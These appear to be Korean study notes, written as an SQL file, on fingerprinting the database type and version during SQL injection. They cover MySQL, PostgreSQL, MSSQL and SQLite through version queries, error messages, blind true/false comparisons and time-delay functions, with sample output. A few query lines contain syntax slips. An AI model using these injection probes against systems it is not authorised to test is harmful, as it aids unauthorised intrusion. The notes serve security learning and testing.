--DBMS는 용도와 목적에 따라 MySQL, MSSQL, Oracle, SQLite 등을 선택 해 사용할 수 있다.
--SQL Injection의 취약점을 발견하면 제일 먼저 알아내야 할 정보는 DBMS의 종류와 버전이다.
--정보를 알아내는 방법은 여러가지가 있다

-- 쿼리 실행 결과 출력
SELECT @@version
SELECT version()

-- 에러 메시지 출력
select 1 union select 1,2;
--MySQL => ERROR 1222 (21000): The used SELECT statements have a different number of columns
(select * from not_exists_table)
--SQLite => Error: no such table: not_exists_table


-- 애플리케이션에서 쿼리 실행 결과가 아닌 참과 거짓 여부만을 출력할 경우
-- Blind SQL Injection 공격으로 DBMS를 알아낼 수 있다
-- 번전 활경 변수 및 함수를 통해 가져온 버전을 한 바이트씩 비교해서 알아냄
mid(@@version, 1, 1)='5';
substr(version(),1,1)='p';


-- 애플리케이션에서 쿼리와 관련된 어떠한 결과도 출력하지 않는 경우 지연 함수를 사용하는 방법이 있다.
-- 일부 DBMS에서는 해당 함수가 존재하지 않기 때문에 시스템에 맞는 시간 지연 함수를 사용함
sleep(10)
pg_sleep(10)


MySQL 

-- version 환경 변수 또는 version 함수를 사용해 MySQL DBMS의 버전과 운영 체제 정보를 알아낸 모습이다
select @@version; # select version()
+-------------------------+
| @@version               |
+-------------------------+
| 5.7.29-0ubuntu0.16.04.1 |
+-------------------------+
1 row in set (0.00 sec)

-- 에러 메시지에 포함된 키워드로 DBMS 정보를 알아냄
select 1 union select 1, 2;
-- ERROR 1222 (21000): The used SELECT statements have a different number of columns

--참 또는 거짓 출력
--version 환경 변수의 값이 "5.7.29-0ubuntu0.16.04." 일 때 Blind SQLI로 한 글자씩 알아냄
--@@version => '5.7.29-0ubuntu0.16.04.', mid(@@version, 1, 1) => '5'
select mid(@@version, 1, 1) = '5';
+------------------------+
| mid(@@version,1,1)='5' |
+------------------------+
|                      1 |
+------------------------+
1 row in set (0.00 sec)
mysql> select mid(@@version, 1, 1)='6';
+------------------------+
| mid(@@version,1,1)='6' |
+------------------------+
|                      0 |
+------------------------+
1 row in set (0.00 sec)




PostgreSQL

--쿼리 실행 결과 출력
postgres=$ select version();
version
--------
 PostgreSQL 12.2 (Debian 12.2-2.pgdg100+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 8.3.0-6) 8.3.0, 64-bit
(1 row)

-- 에러 메시지 출력
postgres=$ select 1 union select 1, 2;
ERROR:  each UNION query must have the same number of columns
LINE 1: select 1 union select 1, 2;
--  에러 메시지를 검색해보면 PostgreSQL에서 출력하는 문자열임을 확인할 수 있다


-- 참 또는 거짓 출력
/* version() => 'PostgreSQL ...', substr(version(), 1, 1) => 'P' */
postgres=$ select substr(version(), 1, 1)='P';
 ?column?
----------
 t
(1 row)
postgres=$ select substr(version(), 1, 1)='Q';
 ?column?
----------
 f
(1 row)

-- 애플리케이션에서 쿼리 실행 결과를 반환하지 않을 때
-- pg_sleep 함수를 사용해 시간 지연 발생 여부로 알아내는 모습
postgres=$ select substr(version(), 1, 1)='P' and pg_sleep(10);
 pg_sleep
----------
(1 row)




MSSQL 
-- 쿼리 실행 결과
select @@version;
---------------------------------------------------------------------
---------------------------------------------------------------------
Microsoft SQL Server 2017 (RTM-CU13) (KB4466404) - 14.0.3048.4 (X64)
	Nov 30 2018 12:57:58
	Copyright (C) 2017 Microsoft Corporation
	Developer Edition (64-bit) on Linux (Ubuntu 16.04.5 LTS)
(1 rows affected)

-- 에러 메시지 출력
select 1 union select 1,2;
Msg 205, Level 16, State 1, Server e2cb36ec2593, Line 1
All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.asdf
-- 에러 메시지를 검색해보면 MSSQL에서 출력하는 문자열임을 확인할 수 있다.

-- 참 또는 거짓
-- @@version => 'Microsoft SQL Server...', substring(@@version, 1, 1) => 'M'
>select 1 from test where substring(@@version, 1, 1)='M';
-----------
          1 -- 참(TRUE)
(1 rows affected)
1>select 1 from test where substring(@@version, 1, 1)='N';
2> go -- 아니라는 뜻
-----------
(0 rows affected)

-- 예외상황
-- waitfor delay 를 사용하여 시간 지연 발생 여부를 알아냄
select 1 from substring(@@version, 1, 1) = 'M' and waitfor delay '0:0:5';




SQLite

--쿼리 실행 결과 출력
select sqlite_version();
3.11.0

-- 에러 메시지 출력
select 1 union select 1,2;
Error: SELECTs to the left and right of UNION do not have the same number of result columns
-- 에러 메시지를 검색해보면 SQLite에서 출력하는 문자열임을 확인할 수 있다

-- 참 또는 거짓 출력
-- sqlite_version() => '3.11.0', substr(sqlite_version(), 1, 1) => '3'
select substr(sqlite_version(), 1, 1)= '3';
1
select substr(sqlite_version(), 1, 1)= '4';
0

-- 예외 상황
-- LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2))))를 통해 시간 지연 방생 여부를 알아냄
select case when substr(sqlite_version(), 1, 1)='3' then
LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2)))) else 1=1 end;
-- 참이라면 지연 발생 코드 실행 거짓이라면 1=1 식을 실행

